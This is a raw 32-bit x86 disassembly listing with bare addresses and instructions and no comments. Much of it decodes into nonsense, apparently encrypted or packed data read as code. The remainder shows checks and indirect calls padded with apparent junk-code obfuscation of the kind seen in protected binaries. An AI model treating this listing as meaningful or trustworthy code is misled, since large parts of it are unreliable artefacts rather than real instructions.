  41ae41:	je     0x41ae63
  41ae43:	out    dx,eax
  41ae44:	mov    dl,0x9c
  41ae46:	gs xchg edx,ebp
  41ae49:	push   cs
  41ae4a:	or     eax,0x9a91ff95
  41ae4f:	mov    cl,0x3e
  41ae51:	aam    0x7c
  41ae53:	inc    eax
  41ae54:	xor    DWORD PTR [eax],edi
  41ae56:	cmp    DWORD PTR [eax+0x6f],0xffffffa6
  41ae5a:	mov    dl,0x18
  41ae5c:	push   ecx
  41ae5d:	mov    edi,0x829f87d
  41ae62:	inc    ebx
  41ae63:	sub    ebp,DWORD PTR ds:0x2ae1
  41ae69:	and    eax,0x6f90
  41ae6e:	mov    DWORD PTR [esp+0x30],eax
  41ae72:	mov    DWORD PTR [esp+0x10],0x1515
  41ae7a:	mov    eax,DWORD PTR [esp+0x10]
  41ae7e:	jmp    0x41b0db
  41ae83:	sub    al,0xff
  41ae85:	jmp    0xe1b3:0xbcbce956
  41ae8c:	in     al,0x38
  41ae8e:	xchg   edx,eax
  41ae8f:	xor    BYTE PTR ds:0x31e3920c,0xc0
  41ae96:	mov    esi,0xbebec235
  41ae9b:	pop    es
  41ae9c:	xchg   ebp,eax
  41ae9d:	repnz (bad) 
  41aea0:	in     eax,dx
  41aea1:	jnp    0x41ae86
  41aea3:	push   cs
  41aea4:	loopne 0x41ae71
  41aea6:	jmp    0x554ac416
  41aeab:	fsubr  DWORD PTR [edx+edi*2]
  41aeae:	push   0x714ec2e8
  41aeb3:	rcr    BYTE PTR [ebx+ebx*4-0x68],cl
  41aeb7:	dec    esp
  41aeb8:	jle    0x41af32
  41aeba:	xchg   cl,al
  41aebc:	jp     0x41ae9a
  41aebe:	test   BYTE PTR [eax-0x82f86af],0x70
  41aec5:	mov    ecx,0x579e5028
  41aeca:	das    
  41aecb:	cmp    eax,0x54ae77a9
  41aed0:	sub    esp,ecx
  41aed2:	hlt    
  41aed3:	jl     0x41aee9
  41aed5:	fist   WORD PTR [ebx]
  41aed7:	mov    ch,0x40
  41aed9:	out    0x68,eax
  41aedb:	xor    edi,eax
  41aedd:	out    0xb0,al
  41aedf:	xchg   ecx,eax
  41aee0:	daa    
  41aee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee2:	push   ebp
  41aee3:	or     bh,cl
  41aee5:	xchg   edi,eax
  41aee6:	ins    DWORD PTR es:[edi],dx
  41aee7:	xor    bl,BYTE PTR [ebx+0x20]
  41aeea:	pop    esp
  41aeeb:	retf   0xad7f
  41aeee:	xchg   ebx,eax
  41aeef:	loopne 0x41aead
  41aef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aef2:	xlat   BYTE PTR ds:[ebx]
  41aef3:	xchg   edi,eax
  41aef4:	sub    eax,0x953ceacb
  41aef9:	and    eax,0x24f636f4
  41aefe:	cli    
  41aeff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af00:	clc    
  41af01:	(bad)  
  41af02:	pop    edx
  41af03:	imul   eax,eax,0x57518aa6
  41af09:	cmovge ebx,DWORD PTR [ecx]
  41af0c:	popf   
  41af0d:	sbb    ah,BYTE PTR [ecx+0x60]
  41af10:	add    DWORD PTR [ecx+0x2a],esp
  41af13:	dec    ebp
  41af14:	into   
  41af15:	idiv   ch
  41af17:	inc    esp
  41af18:	mov    esp,0x124bbb6b
  41af1d:	lock out dx,eax
  41af1f:	retf   
  41af20:	shr    BYTE PTR [edi],0x2c
  41af23:	sbb    bh,BYTE PTR ss:[eax]
  41af26:	jl     0x41aecd
  41af28:	stos   BYTE PTR es:[edi],al
  41af29:	pop    eax
  41af2a:	mov    eax,0x953423aa
  41af2f:	fcmove st,st(7)
  41af31:	stc    
  41af32:	pop    ebp
  41af33:	icebp  
  41af34:	in     al,dx
  41af35:	(bad)  
  41af36:	out    0xc8,eax
  41af38:	ins    BYTE PTR es:[edi],dx
  41af39:	jne    0x41af79
  41af3b:	mov    ebp,0x1a14550d
  41af40:	ds sahf 
  41af42:	xchg   esp,eax
  41af43:	xchg   edx,eax
  41af44:	xchg   ecx,eax
  41af45:	pop    ecx
  41af46:	mov    ds:0xa22ad4ab,al
  41af4b:	cld    
  41af4c:	dec    eax
  41af4d:	leave  
  41af4e:	scas   al,BYTE PTR es:[edi]
  41af4f:	add    bl,BYTE PTR [ebx]
  41af51:	push   ebx
  41af52:	and    eax,0xe6e359d8
  41af57:	jo     0x41af50
  41af59:	push   0x11
  41af5b:	js     0x41af9e
  41af5d:	mov    ebp,0x8b4da751
  41af62:	pushf  
  41af63:	mov    cl,0x37
  41af65:	xchg   edi,eax
  41af66:	push   esp
  41af67:	arpl   WORD PTR [ebx],cx
  41af69:	iret   
  41af6a:	cmp    al,0x1f
  41af6c:	pop    ebx
  41af6d:	mov    esp,ebx
  41af6f:	mov    fs,edx
  41af71:	popf   
  41af72:	in     ax,0x6e
  41af75:	push   0xfffffffd
  41af77:	ficom  WORD PTR [ebx+0x3d0a973f]
  41af7d:	push   es
  41af7e:	fstp   TBYTE PTR [ebx+edx*4]
  41af81:	and    ah,BYTE PTR [ecx+0x75]
  41af84:	arpl   WORD PTR [ecx-0x51],si
  41af87:	and    cl,BYTE PTR [eax]
  41af89:	push   0xffffffd6
  41af8b:	clc    
  41af8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af8d:	lock and edx,ecx
  41af90:	add    eax,0xccedc672
  41af95:	xchg   BYTE PTR [esi],bl
  41af97:	sahf   
  41af98:	mov    es,WORD PTR [edi-0x6a]
  41af9b:	dec    ecx
  41af9c:	gs shl ecx,0x8c
  41afa0:	sbb    edi,0x25c9b16f
  41afa6:	inc    edx
  41afa7:	pop    es
  41afa8:	fs adc bl,0x84
  41afac:	fst    QWORD PTR [ebp-0x34]
  41afaf:	bound  ebx,QWORD PTR [edi-0x7f]
  41afb2:	or     esi,DWORD PTR [edi+0x27]
  41afb5:	outs   dx,BYTE PTR ds:[esi]
  41afb6:	mov    esi,DWORD PTR [ebp-0x7b]
  41afb9:	ss push ecx
  41afbb:	inc    esp
  41afbc:	cmp    eax,0x7b6c0c20
  41afc1:	mov    ds:0xd9b06895,al
  41afc6:	mov    dl,BYTE PTR [esi+0x70469484]
  41afcc:	int    0x89
  41afce:	mov    esi,?
  41afd0:	iret   
  41afd1:	cli    
  41afd2:	ds jno 0x41afe2
  41afd5:	or     esi,DWORD PTR [edx]
  41afd7:	push   0xc7865527
  41afdc:	loope  0x41af72
  41afde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afdf:	ins    DWORD PTR es:[edi],dx
  41afe0:	add    edx,DWORD PTR [ebx-0xb]
  41afe3:	fs dec ebx
  41afe5:	push   edx
  41afe6:	push   es
  41afe7:	imul   eax,DWORD PTR [ebx],0xffffffc1
  41afea:	test   BYTE PTR [edx],ah
  41afec:	xchg   esp,eax
  41afed:	cli    
  41afee:	jae    0x41b055
  41aff0:	inc    ebx
  41aff1:	dec    esi
  41aff2:	ficomp WORD PTR [ebx]
  41aff4:	dec    eax
  41aff5:	inc    edi
  41aff6:	push   ss
  41aff7:	stos   BYTE PTR es:[edi],al
  41aff8:	rcr    esi,0x6f
  41affb:	lock xor al,0xc
  41affe:	push   ds
  41afff:	dec    ebx
  41b000:	push   cs
  41b001:	fcmovne st,st(4)
  41b003:	or     al,0x41
  41b005:	push   0xfffffff4
  41b007:	jmp    DWORD PTR [ecx+eiz*8]
  41b00a:	sub    BYTE PTR [eax],al
  41b00c:	jg     0x41afae
  41b00e:	jmp    0xa5cdf417
  41b013:	(bad)  
  41b014:	int3   
  41b015:	mov    esp,es
  41b017:	fs test cl,ch
  41b01a:	stos   DWORD PTR es:[edi],eax
  41b01b:	ds rcl bh,0x8d
  41b01f:	xchg   edi,eax
  41b020:	leave  
  41b021:	mov    al,0x28
  41b023:	test   eax,0x98461e78
  41b028:	test   al,0xe1
  41b02a:	sub    eax,0xeccbe5b
  41b02f:	push   edx
  41b030:	inc    ecx
  41b031:	and    ebp,DWORD PTR [ecx]
  41b033:	sbb    DWORD PTR [ebx],esi
  41b035:	xchg   DWORD PTR [ecx+0xa12bccc],ecx
  41b03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b03c:	call   0x45d697ae
  41b041:	pop    ebp
  41b042:	ret    
  41b043:	call   0x8122:0x20451cb6
  41b04a:	sub    DWORD PTR [eax-0x34c83678],esp
  41b050:	inc    ebx
  41b051:	daa    
  41b052:	mov    cl,0x2c
  41b054:	rcl    BYTE PTR [ecx+0x1],1
  41b057:	ins    BYTE PTR es:[edi],dx
  41b058:	jmp    0x4877:0xded532ac
  41b05f:	loop   0x41affb
  41b061:	xor    edx,DWORD PTR [ebx]
  41b063:	adc    al,0x85
  41b065:	aas    
  41b066:	gs sub eax,0xe15d855a
  41b06c:	jg     0x41b030
  41b06e:	mov    ds:0x1c10d57a,eax
  41b073:	mov    ds,WORD PTR ss:[esi+0x502816f4]
  41b07a:	jp     0x41b052
  41b07c:	push   eax
  41b07d:	pop    esi
  41b07e:	xchg   ebp,eax
  41b07f:	(bad)  
  41b080:	out    0x9d,eax
  41b082:	sub    BYTE PTR ds:0x3df398db,ah
  41b088:	std    
  41b089:	cli    
  41b08a:	pop    ss
  41b08b:	gs stos DWORD PTR es:[edi],eax
  41b08d:	clc    
  41b08e:	jns    0x41b0d2
  41b090:	push   edi
  41b091:	push   0x1a555e39
  41b096:	ss retf 
  41b098:	mov    bh,0x74
  41b09a:	mov    al,ds:0x42176504
  41b09f:	cmp    DWORD PTR [eax+0x43],ebx
  41b0a2:	xchg   ebp,eax
  41b0a3:	push   ecx
  41b0a4:	or     DWORD PTR [ecx+0x78fc7e40],0xaf21e5cc
  41b0ae:	call   0xd58b:0x7bb91d6b
  41b0b5:	add    DWORD PTR [edi],esp
  41b0b7:	lds    edx,FWORD PTR [edi+0x77]
  41b0ba:	push   es
  41b0bb:	js     0x41b0ae
  41b0bd:	xchg   ecx,edi
  41b0bf:	retf   0x2cb1
  41b0c2:	mov    ebx,ebp
  41b0c4:	cli    
  41b0c5:	mov    ebx,0xb955ce9
  41b0ca:	cwde   
  41b0cb:	mov    ds:0x1308f1b4,eax
  41b0d0:	sbb    eax,0xc3cf35b0
  41b0d5:	push   ds
  41b0d6:	push   esp
  41b0d7:	and    ecx,DWORD PTR [edx+0x20]
  41b0da:	mov    ch,0x8b
  41b0dc:	dec    esp
  41b0dd:	and    al,0x30
  41b0df:	or     eax,0x7113
  41b0e4:	add    eax,0x3d6a
  41b0e9:	cmp    ecx,eax
  41b0eb:	je     0x41b438
  41b0f1:	mov    eax,DWORD PTR [esp+0x40]
  41b0f5:	mov    edx,DWORD PTR [esp+0x18]
  41b0f9:	mov    edi,DWORD PTR [esp+0x1c]
  41b0fd:	xor    ecx,ecx
  41b0ff:	shld   ecx,eax,0x2
  41b103:	shl    eax,0x2
  41b106:	xor    eax,ebx
  41b108:	xor    ecx,esi
  41b10a:	cmp    eax,edx
  41b10c:	jne    0x41b11a
  41b112:	cmp    ecx,edi
  41b114:	je     0x41b3f1
  41b11a:	mov    eax,DWORD PTR [esp+0x44]
  41b11e:	mov    eax,DWORD PTR [esp+0x44]
  41b122:	mov    eax,DWORD PTR [esp+0x44]
  41b126:	mov    ecx,DWORD PTR [esp+0x44]
  41b12a:	jmp    0x41b387
  41b12f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	lea    ecx,[ecx-0x67]
  41b134:	jnp    0x41b171
  41b136:	mov    bh,0x0
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	dec    esp
  41b13a:	xchg   edx,eax
  41b13b:	xchg   esp,eax
  41b13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b13d:	xlat   BYTE PTR ds:[ebx]
  41b13e:	jecxz  0x41b19c
  41b140:	xor    eax,0xc235bec0
  41b145:	mov    esi,0x1f55bebe
  41b14a:	xchg   esp,eax
  41b14b:	in     al,dx
  41b14c:	loope  0x41b109
  41b14e:	imul   ebp,DWORD PTR [ebp+eax*8-0x42681b9f],0x51e2c842
  41b159:	mov    edx,0xa87928ae
  41b15e:	jns    0x41b0f3
  41b160:	js     0x41b1a3
  41b162:	mov    esi,DWORD PTR [eax+0x2498d47c]
  41b168:	sbb    BYTE PTR [esi],dl
  41b16a:	inc    ebp
  41b16b:	push   esp
  41b16c:	out    0xf3,al
  41b16e:	jbe    0x41b116
  41b170:	mov    al,0x70
  41b172:	jg     0x41b1cf
  41b174:	mov    es,esp
  41b176:	xchg   esi,eax
  41b177:	jge    0x41b1b0
  41b179:	les    esp,FWORD PTR [esi-0xea71aa7]
  41b17f:	test   eax,0xf976d03b
  41b184:	jmp    DWORD PTR [ebx]
  41b186:	pop    esp
  41b187:	adc    al,0x30
  41b189:	or     edi,ecx
  41b18b:	rcr    eax,cl
  41b18d:	cwde   
  41b18e:	call   0x8435:0xfcd26643
  41b195:	and    eax,0x9d1f41b0
  41b19a:	jmp    FWORD PTR [edx+0x4b87bb3c]
  41b1a0:	push   edi
  41b1a1:	inc    edx
  41b1a2:	pop    ebx
  41b1a3:	mov    eax,ds:0x867b98a0
  41b1a8:	aaa    
  41b1a9:	imul   ecx
  41b1ab:	jge    0x41b1c1
  41b1ad:	test   BYTE PTR [edx],ah
  41b1af:	(bad)  
  41b1b0:	mov    ebp,0x5e0f64a4
  41b1b5:	outs   dx,BYTE PTR ds:[esi]
  41b1b6:	push   sp
  41b1b8:	jae    0x41b170
  41b1ba:	xor    ecx,DWORD PTR [ebp-0x1ad42856]
  41b1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1c1:	pop    eax
  41b1c2:	mov    bh,0xef
  41b1c4:	adc    al,al
  41b1c6:	(bad)  
  41b1c7:	stc    
  41b1c8:	les    esi,FWORD PTR [esi-0x1e0c5232]
  41b1ce:	sub    eax,0x3235b70b
  41b1d3:	and    esp,ebx
  41b1d5:	lea    esi,[eax-0x163af84f]
  41b1db:	xor    al,0xab
  41b1dd:	inc    eax
  41b1de:	lds    eax,FWORD PTR ds:0x1cfb0341
  41b1e4:	sahf   
  41b1e5:	or     bh,BYTE PTR [edx+0x6b93ac08]
  41b1eb:	dec    ebp
  41b1ec:	lock add eax,0x68610891
  41b1f2:	xchg   ecx,eax
  41b1f3:	mov    al,0xe1
  41b1f5:	cmp    cl,BYTE PTR [ebx-0x60df8e81]
  41b1fb:	adc    al,0xb
  41b1fd:	jecxz  0x41b1a2
  41b1ff:	push   eax
  41b200:	fdiv   DWORD PTR [eax*1-0x35760eac]
  41b207:	jg     0x41b229
  41b209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b20a:	push   ds
  41b20b:	rol    BYTE PTR [ecx],1
  41b20d:	mov    al,ds:0x8f5c391b
  41b212:	pusha  
  41b213:	test   DWORD PTR gs:[esi-0x17],0xcf28addb
  41b21b:	xor    edx,DWORD PTR [edi-0x50]
  41b21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b21f:	scas   al,BYTE PTR es:[edi]
  41b220:	(bad)  
  41b221:	shr    ch,cl
  41b223:	mov    dh,0x97
  41b225:	fwait
  41b226:	adc    ah,BYTE PTR [ebx+0x12]
  41b229:	mov    ebp,ebp
  41b22b:	add    eax,0xd5f7ff4f
  41b230:	icebp  
  41b231:	xor    DWORD PTR [ecx+0x20a1c0dc],ecx
  41b237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b238:	inc    ebx
  41b239:	(bad)  
  41b23a:	pop    esi
  41b23b:	test   ebx,ecx
  41b23d:	mul    BYTE PTR [eax]
  41b23f:	mov    ds,WORD PTR [edi+0x6d48460a]
  41b245:	repz fwait
  41b247:	std    
  41b248:	mov    bl,0xb8
  41b24a:	sbb    DWORD PTR [eax+0x66],esi
  41b24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b24e:	(bad)  
  41b24f:	sbb    BYTE PTR [edi-0x4c],dh
  41b252:	sti    
  41b253:	jecxz  0x41b248
  41b255:	fs repnz das 
  41b258:	push   0xffffffa7
  41b25a:	jnp    0x41b28f
  41b25c:	push   ebx
  41b25d:	stc    
  41b25e:	and    al,0x19
  41b260:	xchg   ebp,eax
  41b261:	leave  
  41b262:	pop    ss
  41b263:	pushf  
  41b264:	mov    al,0xec
  41b266:	mov    ds:0x48425112,al
  41b26b:	push   ds
  41b26c:	iret   
  41b26d:	aaa    
  41b26e:	cmp    eax,0xfe3e88c5
  41b273:	stos   BYTE PTR es:[edi],al
  41b274:	mov    BYTE PTR ds:0xe3a788b,ah
  41b27a:	aad    0x9a
  41b27c:	dec    esi
  41b27d:	fdivp  st(1),st
  41b27f:	pop    esp
  41b280:	push   esp
  41b281:	sbb    eax,0xc4199bb1
  41b286:	out    0x1d,eax
  41b288:	and    edx,DWORD PTR [edx+0x6]
  41b28b:	jl     0x41b24a
  41b28d:	pop    esi
  41b28e:	rcr    BYTE PTR [edx-0x5d],1
  41b291:	or     al,0xa0
  41b293:	push   0x5b
  41b295:	inc    esp
  41b296:	mov    cl,BYTE PTR [ebx+0x5f]
  41b299:	aaa    
  41b29a:	pop    ds
  41b29b:	pop    ss
  41b29c:	stos   BYTE PTR es:[edi],al
  41b29d:	iret   
  41b29e:	ret    0xf7cd
  41b2a1:	push   ebp
  41b2a2:	out    dx,al
  41b2a3:	xchg   ebp,eax
  41b2a4:	adc    al,0xbf
  41b2a6:	cmp    eax,0xf83a8636
  41b2ab:	push   edx
  41b2ac:	sub    esi,DWORD PTR [ebx+0x12]
  41b2af:	mov    cl,0x74
  41b2b1:	fcomp  DWORD PTR [eax]
  41b2b3:	dec    ecx
  41b2b4:	pop    ebx
  41b2b5:	xor    DWORD PTR [ebp+0x1dabeec6],edi
  41b2bb:	inc    esp
  41b2bc:	jmp    0x38cb:0x99d56564
  41b2c3:	push   eax
  41b2c4:	jg     0x41b30f
  41b2c6:	inc    eax
  41b2c7:	lods   eax,DWORD PTR ds:[esi]
  41b2c8:	jg     0x41b272
  41b2ca:	into   
  41b2cb:	aad    0x64
  41b2cd:	push   cs
  41b2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2cf:	mov    ebx,0x88e65cd
  41b2d4:	ss push eax
  41b2d6:	mov    cl,bl
  41b2d8:	sub    DWORD PTR [ebp+0x4],edx
  41b2db:	xor    esp,edx
  41b2dd:	inc    edx
  41b2de:	jne    0x41b288
  41b2e0:	rcr    DWORD PTR [ecx],cl
  41b2e2:	arpl   bp,dx
  41b2e4:	in     al,0x27
  41b2e6:	dec    edx
  41b2e7:	sub    esp,DWORD PTR [edx-0x3ca53f8b]
  41b2ed:	pop    ebx
  41b2ee:	loopne 0x41b353
  41b2f0:	cmp    dl,BYTE PTR [eax+0x123adac]
  41b2f6:	sbb    BYTE PTR [ebx],ah
  41b2f8:	and    edi,DWORD PTR [eax]
  41b2fa:	xchg   esi,eax
  41b2fb:	jl     0x41b2b6
  41b2fd:	cmp    esi,esp
  41b2ff:	inc    edi
  41b300:	lods   eax,DWORD PTR ds:[esi]
  41b301:	mov    ds:0x7e4a55d6,al
  41b306:	addr16 dec edx
  41b308:	fcom   QWORD PTR [edx+0x25cffae5]
  41b30e:	add    al,0x89
  41b310:	addr16 jo 0x41b2f0
  41b313:	rcr    BYTE PTR [eax+0x215a3a34],1
  41b319:	into   
  41b31a:	dec    eax
  41b31b:	mov    DWORD PTR [edx+0x265a4009],ebp
  41b321:	sub    DWORD PTR [ebx],esi
  41b323:	pop    es
  41b324:	(bad)  
  41b325:	out    0x9b,eax
  41b327:	loope  0x41b315
  41b329:	push   ds
  41b32a:	push   esp
  41b32b:	leave  
  41b32c:	divps  xmm7,XMMWORD PTR [ebp-0x6f5471d2]
  41b333:	pop    esp
  41b334:	cmp    ecx,DWORD PTR [ebp+0x41]
  41b337:	sub    ax,WORD PTR [ebx+eax*8+0x6b]
  41b33c:	and    eax,0x1e
  41b33f:	and    eax,0x432d2404
  41b344:	jg     0x41b335
  41b346:	movsx  ebx,BYTE PTR [eax+0x1c]
  41b34a:	xchg   edx,eax
  41b34b:	add    al,BYTE PTR [edi]
  41b34d:	int3   
  41b34e:	ret    0x87c1
  41b351:	mov    ecx,0x1a34af15
  41b356:	pop    es
  41b357:	and    DWORD PTR [eax-0x39],ebx
  41b35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b35b:	aad    0x8c
  41b35d:	add    eax,0xb5e5cac8
  41b362:	jecxz  0x41b2e5
  41b364:	xlat   BYTE PTR ds:[ebx]
  41b365:	shl    BYTE PTR [esi],cl
  41b367:	rcl    DWORD PTR [ebx],1
  41b369:	lods   eax,DWORD PTR ds:[esi]
  41b36a:	ret    
  41b36b:	leave  
  41b36c:	jg     0x41b3d0
  41b36e:	mov    dh,0x97
  41b370:	clc    
  41b371:	bound  eax,QWORD PTR [ecx]
  41b373:	mov    al,ds:0xea215828
  41b378:	pop    ebx
  41b379:	jb     0x41b3f1
  41b37b:	pop    eax
  41b37c:	pop    edx
  41b37d:	add    edi,0xffffff94
  41b380:	in     eax,0x1a
  41b382:	fistp  DWORD PTR [ebx+0x35cd2873]
  41b388:	scas   eax,DWORD PTR es:[edi]
  41b389:	fwait
  41b38a:	push   es
  41b38b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38c:	xor    ecx,0xfffffffe
  41b38f:	shr    eax,0x2
  41b392:	shl    ecx,0x1e
  41b395:	or     eax,ecx
  41b397:	xor    ecx,ecx
  41b399:	shld   ecx,eax,0x2
  41b39d:	shl    eax,0x2
  41b3a0:	xor    eax,ebx
  41b3a2:	xor    ecx,esi
  41b3a4:	cmp    eax,0xcb79b572
  41b3a9:	jne    0x41b3b7
  41b3af:	cmp    ecx,esi
  41b3b1:	je     0x41b438
  41b3b7:	mov    eax,DWORD PTR [esp+0x60]
  41b3bb:	cdq    
  41b3bc:	mov    eax,DWORD PTR [esp+0x60]
  41b3c0:	mov    ecx,edx
  41b3c2:	cdq    
  41b3c3:	shld   edx,eax,0x2
  41b3c7:	shr    ecx,0x1e
  41b3ca:	xor    edi,edi
  41b3cc:	shl    eax,0x2
  41b3cf:	or     eax,ecx
  41b3d1:	or     edx,edi
  41b3d3:	mov    ecx,edx
  41b3d5:	mov    edx,DWORD PTR [esp+0x18]
  41b3d9:	xor    eax,ebx
  41b3db:	xor    ecx,esi
  41b3dd:	mov    esi,DWORD PTR [esp+0x1c]
  41b3e1:	cmp    edx,eax
  41b3e3:	jne    0x41b3f1
  41b3e9:	cmp    esi,ecx
  41b3eb:	je     0x41b438
  41b3f1:	push   DWORD PTR ds:0x4227a8
  41b3f7:	push   DWORD PTR ds:0x42253c
  41b3fd:	mov    eax,ds:0x4226b8
  41b402:	mov    eax,DWORD PTR [eax+0x1a4]
  41b408:	push   DWORD PTR [eax]
  41b40a:	mov    eax,DWORD PTR [esp+0x78]
  41b40e:	call   eax
  41b410:	mov    ecx,DWORD PTR ds:0x4226b8
  41b416:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41b41c:	mov    DWORD PTR [ecx],eax
  41b41e:	mov    eax,ds:0x4226b8
  41b423:	push   0x4
  41b425:	add    eax,0x1dc
  41b42a:	push   eax
  41b42b:	lea    eax,[esp+0x84]
  41b432:	push   eax
  41b433:	call   0x411c08
  41b438:	mov    eax,DWORD PTR [esp+0x7c]
  41b43c:	mov    eax,DWORD PTR [eax]
  41b43e:	pop    edi
  41b43f:	pop    esi
  41b440:	pop    ebx
  41b441:	mov    esp,ebp
  41b443:	pop    ebp
  41b444:	ret    0xc
  41b447:	push   ebp
  41b448:	mov    ebp,esp
  41b44a:	sub    esp,0x23c
  41b450:	push   ebx
  41b451:	cmp    DWORD PTR ds:0x428515,0x0
  41b458:	mov    DWORD PTR ds:0x4282fd,0x2d97
  41b462:	mov    ecx,DWORD PTR ds:0x428415
  41b468:	mov    ecx,DWORD PTR ds:0x4283e9
  41b46e:	not    ecx
  41b470:	jmp    0x41b4da
  41b475:	mov    eax,ds:0x428431
  41b47a:	cmp    DWORD PTR ds:0x428515,0x0
  41b481:	jge    0x41b4c9
  41b487:	push   0x73dd
  41b48c:	push   DWORD PTR [ebp-0x18]
  41b48f:	push   0x4282a3
  41b494:	push   DWORD PTR [ebp-0x10]
  41b497:	push   DWORD PTR [ebp-0x14]
  41b49a:	call   DWORD PTR ds:0x42e108
  41b4a0:	neg    ecx
  41b4a2:	movzx  ecx,WORD PTR ds:0x428311
  41b4a9:	sbb    ecx,DWORD PTR ds:0x428401
  41b4af:	mov    DWORD PTR ds:0x428311,ecx
  41b4b5:	and    ecx,DWORD PTR ds:0x428521
  41b4bb:	xor    ecx,ecx
  41b4bd:	or     ecx,DWORD PTR ds:0x428421
  41b4c3:	or     DWORD PTR ds:0x428495,ecx
  41b4c9:	adc    ecx,ecx
  41b4cb:	xor    ecx,ecx
  41b4cd:	movzx  ecx,BYTE PTR ds:0x4283c1
  41b4d4:	or     DWORD PTR ds:0x4283c9,ecx
  41b4da:	push   esi
  41b4db:	push   edi
  41b4dc:	cmp    DWORD PTR ds:0x42852d,0x0
  41b4e3:	mov    ecx,0x4e26
  41b4e8:	mov    DWORD PTR ds:0x428521,ebx
  41b4ee:	mov    DWORD PTR ds:0x4283cd,ecx
  41b4f4:	mov    DWORD PTR ds:0x42849d,edx
  41b4fa:	jmp    0x41b569
  41b4ff:	mov    DWORD PTR ds:0x428321,0x7065
  41b509:	cmp    DWORD PTR ds:0x42852d,0x0
  41b510:	jae    0x41b54d
  41b516:	push   0x1ec2
  41b51b:	push   DWORD PTR [ebp-0x10]
  41b51e:	push   DWORD PTR [ebp-0x10]
  41b521:	push   0x8dff
  41b526:	push   DWORD PTR [ebp-0x18]
  41b529:	push   0x428525
  41b52e:	call   DWORD PTR ds:0x42e290
  41b534:	xor    ecx,0x4175
  41b53a:	movzx  ecx,BYTE PTR ds:0x428419
  41b541:	or     ecx,DWORD PTR ds:0x4283dd
  41b547:	mov    DWORD PTR ds:0x428419,ecx
  41b54d:	add    DWORD PTR ds:0x4283b9,edx
  41b553:	adc    ecx,0x68aa
  41b559:	add    DWORD PTR ds:0x428301,0x591d
  41b563:	dec    DWORD PTR ds:0x428431
  41b569:	mov    DWORD PTR [ebp-0x50],0x1
  41b570:	cmp    DWORD PTR ds:0x42852d,0x0
  41b577:	not    ecx
  41b579:	mov    DWORD PTR ds:0x428311,0x24a
  41b583:	jmp    0x41b5df
  41b588:	mov    DWORD PTR ds:0x428319,0x4cf4
  41b592:	mov    eax,0x7057
  41b597:	cmp    DWORD PTR ds:0x42852d,0x0
  41b59e:	jl     0x41b5c3
  41b5a4:	push   DWORD PTR [ebp-0xc]
  41b5a7:	call   DWORD PTR ds:0x42e10c
  41b5ad:	adc    ecx,DWORD PTR ds:0x4283dd
  41b5b3:	sbb    DWORD PTR ds:0x428401,0x4277
  41b5bd:	and    DWORD PTR ds:0x428485,ecx
  41b5c3:	and    ecx,ecx
  41b5c5:	or     DWORD PTR ds:0x428425,0x5b0f
  41b5cf:	sbb    ecx,0x33b5
  41b5d5:	sub    DWORD PTR ds:0x4283fd,0xb05
  41b5df:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41b5e9:	xor    DWORD PTR ds:0x428319,0x1f8b
  41b5f3:	mov    DWORD PTR [ebp-0xb8],0x1
  41b5fd:	mov    ecx,DWORD PTR [ebp-0xb8]
  41b603:	mov    eax,0x584
  41b608:	xor    edx,edx
  41b60a:	div    ecx
  41b60c:	cmp    DWORD PTR ds:0x4284b1,0x0
  41b613:	mov    DWORD PTR ds:0x428315,0x2b7a
  41b61d:	mov    DWORD PTR ds:0x4284fd,0x6434
  41b627:	mov    DWORD PTR ds:0x428485,0x53bf
  41b631:	jmp    0x41b6a4
  41b636:	mov    DWORD PTR ds:0x4283f5,edi
  41b63c:	movzx  ecx,WORD PTR ds:0x428311
  41b643:	cmp    DWORD PTR ds:0x4284b1,0x0
  41b64a:	jle    0x41b684
  41b650:	push   0x4283dd
  41b655:	push   0x428419
  41b65a:	push   0x4283b5
  41b65f:	call   DWORD PTR ds:0x42e294
  41b665:	xor    DWORD PTR ds:0x428495,edi
  41b66b:	movzx  ecx,BYTE PTR ds:0x4282f1
  41b672:	sub    ecx,DWORD PTR ds:0x4283f9
  41b678:	mov    DWORD PTR ds:0x4282f1,ecx
  41b67e:	adc    DWORD PTR ds:0x4283f1,ecx
  41b684:	adc    ecx,0x4862
  41b68a:	and    ecx,DWORD PTR ds:0x4283f1
  41b690:	or     DWORD PTR ds:0x428495,ecx
  41b696:	mov    ecx,DWORD PTR ds:0x428471
  41b69c:	mov    ecx,DWORD PTR [ecx]
  41b69e:	sub    DWORD PTR ds:0x428419,ecx
  41b6a4:	imul   eax,eax,0x51d4
  41b6aa:	sub    ecx,0x11f6
  41b6b0:	mov    ecx,DWORD PTR [ebp-0xbc]
  41b6b6:	add    DWORD PTR ds:0x4283dd,0x5690
  41b6c0:	xor    eax,ecx
  41b6c2:	adc    DWORD PTR ds:0x428515,edi
  41b6c8:	and    eax,0x4c09
  41b6cd:	sbb    ecx,0x3053
  41b6d3:	mov    ecx,DWORD PTR [ebp-0x50]
  41b6d6:	sub    DWORD PTR ds:0x4283d9,0x428429
  41b6e0:	xor    edx,edx
  41b6e2:	div    ecx
  41b6e4:	sbb    ecx,DWORD PTR ds:0x4283d5
  41b6ea:	sub    eax,0x401
  41b6ef:	mov    ecx,DWORD PTR ds:0x4284b1
  41b6f5:	sub    DWORD PTR ds:0x428521,ecx
  41b6fb:	mov    DWORD PTR [ebp-0x90],eax
  41b701:	mov    DWORD PTR [ebp-0x8c],0x2ff8
